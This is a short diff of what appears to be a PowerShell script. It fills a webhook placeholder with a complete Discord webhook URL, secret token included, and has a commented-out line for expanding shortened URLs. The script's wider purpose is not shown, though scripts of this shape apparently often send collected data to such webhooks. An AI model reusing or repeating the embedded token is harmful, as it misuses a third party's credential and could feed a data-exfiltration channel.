@@ -1,4 +1,4 @@
-$hookurl = "[WEBHOOK]"
+$hookurl = "https://discord.com/api/webhooks/1361300452054143057/SMecZaPMrWiUUDnflhqB3c1FJagkO1UqHTq-uzTZBq4xEI7dQ1rJ5hHIbwtm4uHBC-wt"
 Write-Host $hookurl
 # shortened URL Detection
 # if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
